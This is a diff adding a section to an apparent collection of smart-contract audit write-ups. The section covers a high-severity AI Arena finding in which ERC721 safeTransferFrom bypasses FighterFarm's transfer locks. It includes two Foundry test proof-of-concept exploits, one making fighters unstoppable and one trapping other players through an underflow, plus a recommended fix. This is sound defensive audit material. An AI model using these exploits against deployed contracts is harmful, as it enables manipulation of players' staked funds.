@@ -418,3 +418,119 @@ Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining
 ```
 
 </details>
+
+## 8.[High] A locked fighter can be transferred; leads to game server unable to commit transactions, and unstoppable fighters
+
+### `_beforeTokenTransfer()` hook and `safeTransferFrom(..., data)`
+
+- Summary: The FighterFarm contract's transfer restrictions are bypassed by an inherited function from OpenZeppelin’s ERC721 contract, e.g., i.e., `safeTransferFrom(..., data)`, leading to two main issues: fighters become unstoppable by transferring them to new addresses after winning, preventing point subtraction; and fighters can act as "poison pills" by disrupting the `amountLost` mapping when transferred after losing, causing transaction failures and trapping players in losing zones. Both issues prevent the game server from committing transactions, compromising game integrity.
+
+- Impact & Recommendation: Remove transfer checks from `transferFrom()` and `safeTransferFrom()` functions and enforce transfer restrictions using the `_beforeTokenTransfer()` hook.
+  <br> 🐬: [Source](https://code4rena.com/reports/2024-02-ai-arena#h-01-a-locked-fighter-can-be-transferred-leads-to-game-server-unable-to-commit-transactions-and-unstoppable-fighters) & [Report](https://code4rena.com/reports/2024-02-ai-arena)
+
+<details><summary>POC</summary>
+
+```solidity
+diff --git a/test/RankedBattle.t.sol b/test/RankedBattle.t.sol
+index 6c5a1d7..dfaaad4 100644
+--- a/test/RankedBattle.t.sol
++++ b/test/RankedBattle.t.sol
+@@ -465,6 +465,31 @@ contract RankedBattleTest is Test {
+         assertEq(unclaimedNRN, 5000 * 10 ** 18);
+     }
+
++   /// @notice An exploit demonstrating that it's possible to transfer a staked fighter, and make it immortal!
++    function testExploitTransferStakedFighterAndPlay() public {
++        address player = vm.addr(3);
++        address otherPlayer = vm.addr(4);
++        _mintFromMergingPool(player);
++        uint8 tokenId = 0;
++        _fundUserWith4kNeuronByTreasury(player);
++        vm.prank(player);
++        _rankedBattleContract.stakeNRN(1 * 10 ** 18, tokenId);
++        // The fighter wins one battle
++        vm.prank(address(_GAME_SERVER_ADDRESS));
++        _rankedBattleContract.updateBattleRecord(tokenId, 0, 0, 1500, true);
++        // The player transfers the fighter to other player
++        vm.prank(address(player));
++        _fighterFarmContract.safeTransferFrom(player, otherPlayer, tokenId, "");
++        assertEq(_fighterFarmContract.ownerOf(tokenId), otherPlayer);
++        // The fighter can't lose
++        vm.prank(address(_GAME_SERVER_ADDRESS));
++        vm.expectRevert();
++        _rankedBattleContract.updateBattleRecord(tokenId, 0, 2, 1500, true);
++        // The fighter can only win: it's unstoppable!
++        vm.prank(address(_GAME_SERVER_ADDRESS));
++        _rankedBattleContract.updateBattleRecord(tokenId, 0, 0, 1500, true);
++    }
+
+
+```
+
+```solidity
+diff --git a/test/RankedBattle.t.sol b/test/RankedBattle.t.sol
+index 6c5a1d7..196e3a0 100644
+--- a/test/RankedBattle.t.sol
++++ b/test/RankedBattle.t.sol
+@@ -465,6 +465,62 @@ contract RankedBattleTest is Test {
+         assertEq(unclaimedNRN, 5000 * 10 ** 18);
+     }
+
++/// @notice Prepare two players and two fighters
++function preparePlayersAndFighters() public returns (address, address, uint8, uint8) {
++    address player1 = vm.addr(3);
++    _mintFromMergingPool(player1);
++    uint8 fighter1 = 0;
++    _fundUserWith4kNeuronByTreasury(player1);
++    address player2 = vm.addr(4);
++    _mintFromMergingPool(player2);
++    uint8 fighter2 = 1;
++    _fundUserWith4kNeuronByTreasury(player2);
++    return (player1, player2, fighter1, fighter2);
++}
++
++/// @notice An exploit demonstrating that it's possible to transfer a fighter with funds at stake
++/// @notice After transferring the fighter, it wins the battle,
++/// @notice and the second player can't exit from the stake-at-risk zone anymore.
++function testExploitTransferStakeAtRiskFighterAndSpoilOtherPlayer() public {
++    (address player1, address player2, uint8 fighter1, uint8 fighter2) =
++        preparePlayersAndFighters();
++    vm.prank(player1);
++    _rankedBattleContract.stakeNRN(1_000 * 10 **18, fighter1);
++    vm.prank(player2);
++    _rankedBattleContract.stakeNRN(1_000 * 10 **18, fighter2);
++    // Fighter1 loses a battle
++    vm.prank(address(_GAME_SERVER_ADDRESS));
++    _rankedBattleContract.updateBattleRecord(fighter1, 0, 2, 1500, true);
++    assertEq(_rankedBattleContract.amountStaked(fighter1), 999 * 10 ** 18);
++    // Fighter2 loses a battle
++    vm.prank(address(_GAME_SERVER_ADDRESS));
++    _rankedBattleContract.updateBattleRecord(fighter2, 0, 2, 1500, true);
++    assertEq(_rankedBattleContract.amountStaked(fighter2), 999 * 10 ** 18);
++
++    // On the game server, player1 initiates a battle with fighter1,
++    // then unstakes all remaining stake from fighter1, and transfers it
++    vm.prank(address(player1));
++    _rankedBattleContract.unstakeNRN(999 * 10 ** 18, fighter1);
++    vm.prank(address(player1));
++    _fighterFarmContract.safeTransferFrom(player1, player2, fighter1, "");
++    assertEq(_fighterFarmContract.ownerOf(fighter1), player2);
++    // Fighter1 wins a battle, and part of its stake-at-risk is derisked.
++    vm.prank(address(_GAME_SERVER_ADDRESS));
++    _rankedBattleContract.updateBattleRecord(fighter1, 0, 0, 1500, true);
++    assertEq(_rankedBattleContract.amountStaked(fighter1), 1 * 10 ** 15);
++    // Fighter2 wins a battle, but the records can't be updated, due to underflow!
++    vm.expectRevert();
++    vm.prank(address(_GAME_SERVER_ADDRESS));
++    _rankedBattleContract.updateBattleRecord(fighter2, 0, 0, 1500, true);
++    // Fighter2 can't ever exit from the losing zone in this round, but can lose battles
++    vm.prank(address(_GAME_SERVER_ADDRESS));
++    _rankedBattleContract.updateBattleRecord(fighter2, 0, 2, 1500, true);
++    (uint32 wins, uint32 ties, uint32 losses) = _rankedBattleContract.getBattleRecord(fighter2);
++    assertEq(wins, 0);
++    assertEq(ties, 0);
++    assertEq(losses, 2);
++}
+```
+
+</details>
